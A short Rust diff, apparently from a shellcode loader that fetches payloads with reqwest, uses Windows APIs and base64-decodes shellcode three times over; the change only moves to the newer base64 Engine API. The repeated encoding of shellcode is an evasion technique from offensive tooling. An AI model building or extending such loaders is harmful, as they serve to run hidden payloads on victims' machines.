@@ -9,7 +9,7 @@ use std::{ptr};
 use bytes::Bytes;
 use std::ffi::c_void;
 use reqwest::Client;
-use base64::decode;
+use base64::{Engine as _, engine::general_purpose};
 use windows::{
     Win32::{
         Foundation::{
@@ -55,7 +55,7 @@ const B64_ITERATIONS: usize = 3;
 fn decode_shellcode(sc: Bytes, b64_iterations: usize) -> Result<Vec<u8>, String> {
     let mut shellcode_vec: Vec<u8> = sc.to_vec();
     for _i in 0..b64_iterations {
-        match decode(shellcode_vec) {
+        match general_purpose::STANDARD.decode(shellcode_vec) {
             Ok(d) => {
                 shellcode_vec = d;
             },
